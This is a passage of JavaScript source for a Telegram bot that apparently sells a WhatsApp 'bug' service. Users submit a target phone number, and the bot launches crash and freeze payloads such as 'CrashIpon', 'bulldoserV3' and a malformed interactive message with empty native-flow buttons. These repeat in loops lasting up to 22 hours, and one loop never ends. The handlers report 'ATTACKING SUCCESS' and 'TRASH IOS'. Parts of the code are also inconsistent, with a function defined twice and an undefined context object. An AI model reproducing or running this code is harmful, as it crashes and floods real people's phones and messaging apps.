  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });
        for (let i = 0; i < 80; i++) {
        await blank(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));   
        await BlankVisco(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await BlankVisco(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await blank(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        }
    

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐇𝐀𝐑𝐃 𝐔𝐈`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});

bot.action(/force_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });

       for (let i = 0; i < 1; i++) {
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));    
        }

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐅𝐎𝐑𝐂𝐄`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});

bot.action(/invis_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });

         await invis(22, target);
    

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐗𝐈𝐕𝐈𝐁𝐋𝐄`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});

bot.action(/invis2_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });

    
        await invis2(22, target);
    

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐗𝐀𝐕𝐄𝐑𝐈𝐔𝐒.`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});

bot.action(/invis3_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });

        
    await invis3(22, target);

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐁𝐔𝐋𝐋𝐃𝐎𝐙𝐄𝐑`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});

bot.action(/invis4_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆.");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });

    
        await invis4(22, target);
    

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐌𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});


bot.action(/invisnoclik_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆.");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });

    
        await invis4(22, target);
        await invisnoclik(22, target);
    

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐌𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});

//=========FUNC IOS=========\\
bot.action(/iosx_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆.");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });
        for (let i = 0; i < 10; i++) {
      await loadedIos(target, false), 
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await CrashIpon(target, false), 
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await IosMJ(target, false), 
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await IosMJ(target, false), 
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await CrashIpon(target, false), 
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await loadedIos(target, false), 
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒.`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});
bot.action(/xis_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("Memulai pengiriman XiS...");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });
    
    for (let i = 0; i < 2; i++) {

        await loadedIos(target, false), 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        }
    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐂𝐑𝐀𝐒𝐇 𝐈𝐎𝐒`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});
bot.start(async (ctx) => {

const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.reply("Kamu harus bergabung ke Group dulu sebelum menggunakan bot ini!", {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Join Group", url: "https://t.me/fathirsthorex" }
                    ]
                ]
            }
        });
    }
  // Mengirim status "mengetik"
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = `
<blockquote>
<b>( 🍁 ) ─ 情報</b> 
<b>─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは高速で柔軟性が高く、安全な自動化ツールです。/xbug と入力して表示する</b> 

<b>「 𝐒𝐢𝐗 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」</b>
<b>࿇ Author : ─!s'sar4h</b>
<b>࿇ Bot Name : ᄓ̻𝐕̻͡𝐀͢𝐒͡𝐈͜𝐎͉͡𝐍͛⍣𝐗͛͒͢͞𝟓</b>
<b>࿇ Type: ( Case─Plugins )</b>
<b>࿇ Premium : ${isPremium ? '✅' : '❌'}</b>
<b>࿇ League : Asia/Sumatera-</b>
</blockquote>
`;

  const mainKeyboard = [
  [
    { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫⍣᳟𝐌͜𝐞͢𝐧͡𝐮༑⃟", callback_data: "owneronli" },
    { text: "𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮͠༑⃟", callback_data: "bugmenu" }
  ],
  [
    { text: "𝐀͢𝐥͡𝐥͜𝐌͢𝐞͡𝐧͜𝐮༑⃟", callback_data: "tqto" }
  ],
  [
    { text: "メーカー", url: "https://t.me/fathirsthore" },
    { text: "チャネル", url: "https://t.me/FATHIR06" }
  ]
];

  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/3duf9v.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

// Handler untuk callback "owner_management"
bot.action('tqto', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const ownerMenuMessage = `
<blockquote>
<b>╭━━━[ ALL MENU ]</b>
<b>┃ ࿗ /xbug [target]</b>
<b>┃ ࿗ /cd [Cooldown user]</b>
<b>┃ ࿗ /addowner add to owner</b>
<b>┃ ࿗ /delowner delate to owner</b>
<b>┃ ࿗ /addadmin - unlock addprem</b>
<b>┃ ࿗ /deladmin - premium features</b>
<b>┃ ࿗ /cekusersc - cek pengguna sc</b>
<b>┃ ࿗ /monitoruser - monitoring</b>
<b>┃ ࿗ /addpairing - connect to wa</b>
<b>┃ ࿗ /maintenance - true / false</b>
<b>╰━━━━━━━━━━━━━━━━━━━❍</b>
</blockquote>
  `;

  const ownerKeyboard = [
    [{
      text: "ボ",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/3duf9v.jpg", {
      caption: ownerMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

bot.action('bugmenu', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const ResellerMenu = `
<blockquote>
<b>╭━━━[ BUG MENU ]</b>
<b>┃ ࿗ /xbug - [Target Select]</b>
<b>┃ ࿗ /cd - [Cooldown User] </b>
<b>╰━━━━━━━━━━━━━━━━━❍</b>
</blockquote>
  `;

  const ownerKeyboard = [
    [{
      text: "ボ",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/3duf9v.jpg", {
      caption: ResellerMenu,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

bot.action('owneronli', async (ctx) => {
  // Hapus pesan sebelumnya
  await ctx.deleteMessage();

  const obfMenu = `
<blockquote>
<b>╭━━━[ OWNER MENU ]</b>
<b>┃ ࿗ /addowner [id]</b>
<b>┃ ࿗ /delowner [id]</b>
<b>┃ ࿗ /addadmin [id]</b>
<b>┃ ࿗ /deladmin [id]</b>
<b>┃ ࿗ /cekusersc [id]</b>
<b>┃ ࿗ /monitoruser [monitoring]</b>
<b>┃ ࿗ /addpairing [number]</b>
<b>┃ ࿗ /maintenance - true / false</b>
<b>╰━━━━━━━━━━━━━━━━❍</b>
</blockquote>
  `;

  const ownerKeyboard = [
    [{
      text: "ボ",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/3duf9v.jpg", {
      caption: obfMenu,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
  }, 3000); // Delay 3 detik
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  const mainMenuMessage = `
<blockquote>
<b>( 🍁 ) ─ 情報</b> 
<b>─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは高速で柔軟性が高く、安全な自動化ツールです。/xbug と入力して表示する</b> 

<b>「 𝐒𝐢𝐗 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」</b>
<b>࿇ Author : ─!s'sar4h</b>
<b>࿇ Bot Name : ᄓ̻𝐗̻͡𝐀͢⍣𝐕͜𝐄͠𝐑͢𝐈𝐔͠𝐒</b>
<b>࿇ Type: ( Case─Plugins )</b>
<b>࿇ Premium : ${isPremium ? '✅' : '❌'}</b>
<b>࿇ League : Asia/Sumatera-</b>
</blockquote>
`;

  const mainKeyboard = [
  [
    { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫⍣᳟𝐌͜𝐞͢𝐧͡𝐮༑⃟", callback_data: "owneronli" },
    { text: "𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮͠༑⃟", callback_data: "bugmenu" }
  ],
  [
    { text: "𝐀͢𝐥͡𝐥͜𝐌͢𝐞͡𝐧͜𝐮༑⃟", callback_data: "tqto" }
  ],
  [
    { text: "メーカー", url: "https://t.me/fathirsthore" },
    { text: "チャネル", url: "https://t.me/FATHIR06" }
  ]
];

  ctx.replyWithPhoto("https://files.catbox.moe/3duf9v.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

//===============FUNC BUG==================\\

//Function New For Beta By Toya @o_tyn
async function invisnoclik(isTarget) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: isTarget,
                        },
                    },
                    body: {
                        text: "Pak Toya in here",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                        ],
                    },
                },
            },
        },
    };

    while (true) {
        await ctx.relayMessage(isTarget, Msg, { participant: { jid: isTarget } });
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

//  [ END FUNC BUG ]  //


async function invis(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 3650) {
        await Promise.all([
        frezbuttoninvis(target, false), 
        frezbuttoninvis(target, false), 
        ]);
        console.log(chalk.blue(`𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐁𝐲 𝐅𝐚𝐭𝐡𝐢𝐫 𝐂𝐫𝐚𝐬𝐡💢`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function invis2(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 200) {
        await Promise.all([
        xPro(target, false), 
        await sleep(1500), 
        xPro(target, false), 
        await sleep(1500), 
        ]);
        console.log(chalk.blue(`𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐁𝐲 𝐅𝐚𝐭𝐡𝐢𝐫 𝐂𝐫𝐚𝐬𝐡💢`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function invis3(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 200) {
        await Promise.all([
        bulldoserV3(target, false), 
        await sleep(1500), 
        bulldoserV3(target, false), 
        await sleep(1500), 
        ]);
        console.log(chalk.blue(`𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐁𝐲 𝐅𝐚𝐭𝐡𝐢𝐫 𝐂𝐫𝐚𝐬𝐡💢`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function invisnoclik(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 200) {
        await Promise.all([
        bulldoserV3(target, false), 
        await sleep(1500), 
        invisnoclik(target, false), 
        await sleep(1500), 
        bulldoserV3(target, false), 
        await sleep(1500), 
        ]);
        console.log(chalk.blue(`𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐁𝐲 𝐅𝐚𝐭𝐡𝐢𝐫 𝐂𝐫𝐚𝐬𝐡💢`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}


async function invis4(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 200) {
        await Promise.all([
        bulldozerx(target, false), 
        await sleep(1500), 
        bulldoserV3(target, false),
        await sleep(1500), 
        xPro(target, false), 
        await sleep(1500), 
        frezbuttoninvis(target, false), 
        await sleep(1500), 
        bulldozerx(target, false), 
        await sleep(1500), 
        bulldoserV3(target, false), 
        await sleep(1500), 
        frezbuttoninvis(target, false), 
        await sleep(1500), 
        xPro(target, false), 
        await sleep(1500), 
        bulldoserV3(target, false), 
        await sleep(1500), 
        ]);
